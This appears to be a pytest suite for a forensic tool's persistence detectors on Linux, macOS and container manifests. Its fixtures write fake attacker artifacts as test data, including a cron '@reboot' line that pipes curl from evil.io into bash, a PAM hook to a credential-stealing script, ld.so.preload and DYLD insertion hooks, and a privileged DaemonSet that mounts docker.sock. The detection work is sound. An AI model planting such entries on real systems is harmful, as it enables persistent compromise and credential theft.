"""Tests for the persistence detection module (Gap 3)."""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from deepview.core.context import AnalysisContext
from deepview.detection.persistence import (
    ContainerPersistenceDetector,
    LinuxPersistenceDetector,
    MacOSPersistenceDetector,
    PersistenceArtifact,
    PersistenceManager,
    PersistenceSeverity,
)


# ---------------------------------------------------------------------------
# Linux
# ---------------------------------------------------------------------------


def _make_fake_linux(root: Path) -> None:
    (root / "etc").mkdir(parents=True, exist_ok=True)
    (root / "etc/crontab").write_text(
        "# comment\n"
        "* * * * * root /usr/bin/zgrep\n"
        "@reboot root curl http://evil.io/pwn | bash\n"
    )
    (root / "etc/cron.d").mkdir()
    (root / "etc/cron.d/backdoor").write_text("0 * * * * attacker /tmp/backdoor\n")

    (root / "etc/systemd/system").mkdir(parents=True)
    (root / "etc/systemd/system/benign.service").write_text(
        "[Service]\nExecStart=/usr/bin/legit-daemon --foreground\n"
    )
    (root / "etc/systemd/system/rootkit.service").write_text(
        "[Service]\nExecStart=/dev/shm/rootkit_loader\n"
    )

    (root / "etc/ld.so.preload").write_text("/tmp/evil.so\n")

    (root / "etc/pam.d").mkdir()
    (root / "etc/pam.d/sshd").write_text(
        "auth required pam_unix.so\n"
        "auth optional pam_exec.so /tmp/steal-creds.sh\n"
    )

    (root / "etc/udev/rules.d").mkdir(parents=True)
    (root / "etc/udev/rules.d/99-evil.rules").write_text(
        'ACTION=="add", RUN+="/tmp/trigger"\n'
    )

    (root / "etc/modules-load.d").mkdir(parents=True)
    (root / "etc/modules-load.d/evil.conf").write_text("evil_lkm\n")


class TestLinuxPersistence:
    def test_cron_detected_with_suspicious_and_benign(self, tmp_path: Path) -> None:
        _make_fake_linux(tmp_path)
        d = LinuxPersistenceDetector(root=tmp_path)
        findings = d.scan_cron()
        kinds = {f.mechanism for f in findings}
        assert "cron" in kinds
        # Benign zgrep should be present but with no suspicious reasons; the
        # curl|bash line must be flagged.
        suspicious = [f for f in findings if f.suspicious_reasons]
        assert any("curl http://evil.io/pwn" in f.command for f in suspicious)

    def test_systemd_flags_dev_shm_execstart(self, tmp_path: Path) -> None:
        _make_fake_linux(tmp_path)
        d = LinuxPersistenceDetector(root=tmp_path)
        findings = d.scan_systemd()
        rootkit = [f for f in findings if "rootkit.service" in f.location]
        assert rootkit
        assert rootkit[0].severity is PersistenceSeverity.HIGH
        assert any("/dev/shm/" in r for r in rootkit[0].suspicious_reasons)

    def test_ld_preload_is_critical(self, tmp_path: Path) -> None:
        _make_fake_linux(tmp_path)
        d = LinuxPersistenceDetector(root=tmp_path)
        findings = d.scan_dynamic_loader()
        preload = [f for f in findings if f.mechanism == "ld_so_preload"]
        assert preload
        assert preload[0].severity is PersistenceSeverity.CRITICAL

    def test_pam_exec_flagged(self, tmp_path: Path) -> None:
        _make_fake_linux(tmp_path)
        d = LinuxPersistenceDetector(root=tmp_path)
        findings = d.scan_pam()
        assert findings
        assert findings[0].mitre_technique == "T1556.003"

    def test_udev_rule_flagged(self, tmp_path: Path) -> None:
        _make_fake_linux(tmp_path)
        d = LinuxPersistenceDetector(root=tmp_path)
        findings = d.scan_udev_rules()
        assert findings
        assert any("RUN+=" in f.command for f in findings)

    def test_full_scan_aggregates(self, tmp_path: Path) -> None:
        _make_fake_linux(tmp_path)
        d = LinuxPersistenceDetector(root=tmp_path)
        findings = d.scan(include_user_scope=False)
        mechanisms = {f.mechanism for f in findings}
        for expected in ("cron", "systemd_service", "ld_so_preload", "pam", "udev_rule"):
            assert expected in mechanisms, mechanisms


# ---------------------------------------------------------------------------
# macOS
# ---------------------------------------------------------------------------


class TestMacOSPersistence:
    def _make_plist(self, path: Path, contents: dict) -> None:
        import plistlib

        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(plistlib.dumps(contents))

    def test_launch_daemon_keepalive_flagged(self, tmp_path: Path) -> None:
        plist = tmp_path / "Library/LaunchDaemons/com.evil.plist"
        self._make_plist(
            plist,
            {
                "Label": "com.evil",
                "ProgramArguments": ["/tmp/backdoor"],
                "RunAtLoad": True,
                "KeepAlive": True,
            },
        )
        d = MacOSPersistenceDetector(root=tmp_path)
        findings = d.scan_launch_items(include_user_scope=False)
        assert findings
        assert findings[0].severity is PersistenceSeverity.HIGH
        assert any("KeepAlive" in r for r in findings[0].suspicious_reasons)

    def test_dyld_insertion_critical(self, tmp_path: Path) -> None:
        plist = tmp_path / "Library/LaunchAgents/com.hook.plist"
        self._make_plist(
            plist,
            {
                "Label": "com.hook",
                "ProgramArguments": ["/usr/bin/nothing"],
                "EnvironmentVariables": {"DYLD_INSERT_LIBRARIES": "/tmp/hook.dylib"},
            },
        )
        d = MacOSPersistenceDetector(root=tmp_path)
        findings = d.scan_dyld_hooks()
        assert findings
        assert findings[0].severity is PersistenceSeverity.CRITICAL


# ---------------------------------------------------------------------------
# Containers
# ---------------------------------------------------------------------------


class TestContainerPersistence:
    def test_privileged_daemonset_flagged(self, tmp_path: Path) -> None:
        manifest = tmp_path / "evil-daemonset.json"
        manifest.write_text(
            json.dumps(
                {
                    "kind": "DaemonSet",
                    "spec": {
                        "template": {
                            "spec": {
                                "hostPID": True,
                                "volumes": [
                                    {
                                        "name": "dockersock",
                                        "hostPath": {"path": "/var/run/docker.sock"},
                                    }
                                ],
                                "containers": [
                                    {
                                        "name": "evil",
                                        "image": "evil:latest",
                                        "securityContext": {"privileged": True},
                                    }
                                ],
                            }
                        }
                    },
                }
            )
        )
        d = ContainerPersistenceDetector(manifest_roots=[tmp_path])
        findings = d.scan()
        assert findings
        reasons = findings[0].suspicious_reasons
        assert any("privileged" in r for r in reasons)
        assert any("hostPath" in r for r in reasons)

    def test_cronjob_with_floating_tag(self, tmp_path: Path) -> None:
        manifest = tmp_path / "job.json"
        manifest.write_text(
            json.dumps(
                {
                    "kind": "CronJob",
                    "spec": {
                        "schedule": "*/5 * * * *",
                        "jobTemplate": {
                            "spec": {
                                "template": {
                                    "spec": {
                                        "containers": [
                                            {"name": "a", "image": "repo/tool:latest"}
                                        ]
                                    }
                                }
                            }
                        },
                    },
                }
            )
        )
        d = ContainerPersistenceDetector(manifest_roots=[tmp_path])
        findings = d.scan()
        assert findings
        assert findings[0].severity is PersistenceSeverity.HIGH


# ---------------------------------------------------------------------------
# Manager + correlation integration
# ---------------------------------------------------------------------------


class TestPersistenceManager:
    def test_manager_feeds_correlation_graph(self, tmp_path: Path) -> None:
        _make_fake_linux(tmp_path)
        ctx = AnalysisContext.for_testing()
        mgr = PersistenceManager(ctx, linux_root=tmp_path, macos_root=tmp_path)
        # Force the Linux detector even on non-Linux CI runners by calling
        # it directly. The manager would ordinarily pick via PlatformInfo.
        findings = mgr._linux.scan(include_user_scope=False)
        mgr._feed_correlator(findings)
        from deepview.core.correlation import EntityKind

        persist_entities = ctx.correlation.graph.entities(EntityKind.PERSISTENCE)
        assert persist_entities, "persistence findings must land in the graph"

    def test_baseline_deviation_marking(self, tmp_path: Path) -> None:
        _make_fake_linux(tmp_path)
        mgr = PersistenceManager(
            context=None,
            linux_root=tmp_path,
            macos_root=tmp_path,
        )
        # Use the Linux detector directly then apply baseline
        findings = mgr._linux.scan(include_user_scope=False)
        fps = {f.fingerprint() for f in findings}
        # Baseline-diff against exactly the first half — second half should
        # all be marked deviations.
        baseline = set(list(fps)[: len(fps) // 2])
        for f in findings:
            f.deviation_from_baseline = f.fingerprint() not in baseline
        deviating = [f for f in findings if f.deviation_from_baseline]
        assert deviating, "deviation marking must work"
